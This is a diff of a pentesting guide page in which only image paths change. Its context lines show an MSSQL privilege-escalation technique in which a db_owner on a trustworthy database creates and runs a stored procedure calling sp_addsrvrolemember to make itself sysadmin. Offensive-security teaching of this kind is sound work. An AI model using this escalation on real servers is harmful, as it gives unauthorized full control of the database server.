@@ -43,7 +43,7 @@ join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
 SELECT suser_sname(owner_sid) FROM sys.databases WHERE name = 'Production'
 ```
 
-![](<../../../../.gitbook/assets/image (68).png>)
+![](<../../../../.gitbook/assets/image (68) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (53).png>)
 
@@ -88,7 +88,7 @@ If the database is set as trustworthy and we have db\_owner privileges, we could
 * Select: "Use Windows Authentication"
 * Port: `1433`
 
-![](<../../../../.gitbook/assets/image (58).png>)
+![](<../../../../.gitbook/assets/image (58) (1).png>)
 
 4\. Click "OK" on the security Issue warning.
 
@@ -113,7 +113,7 @@ Our current user `AMSTERDAM\richard` is db\_owner.
 SELECT suser_sname(owner_sid), * FROM sys.databases
 ```
 
-![](<../../../../.gitbook/assets/image (59).png>)
+![](<../../../../.gitbook/assets/image (59) (1).png>)
 
 `sa` is the owner of the `production` database.
 
@@ -126,7 +126,7 @@ INNER JOIN sys.databases as b
 ON a.name=b.name;
 ```
 
-![](<../../../../.gitbook/assets/image (13) (1).png>)
+![](<../../../../.gitbook/assets/image (13) (1) (1).png>)
 
 The Production database is trustworty.
 
@@ -142,7 +142,7 @@ AS
 EXEC sp_addsrvrolemember 'AMSTERDAM\Richard','sysadmin'
 ```
 
-![](<../../../../.gitbook/assets/image (57).png>)
+![](<../../../../.gitbook/assets/image (57) (1).png>)
 
 8\. Execute the stored procedure:
 
@@ -151,7 +151,7 @@ USE Production;
 EXEC sp_elevate_me
 ```
 
-![](<../../../../.gitbook/assets/image (1).png>)
+![](<../../../../.gitbook/assets/image (1) (1).png>)
 
 9\. Check if we are sysadmin:
 
@@ -159,7 +159,7 @@ EXEC sp_elevate_me
 SELECT is_srvrolemember('sysadmin')
 ```
 
-![](<../../../../.gitbook/assets/image (34) (1).png>)
+![](<../../../../.gitbook/assets/image (34) (1) (1).png>)
 
 The `1` means that we are sysadmin! Check the executing commands page under SQL Server Attacks to read how to execute cmd commands:
 
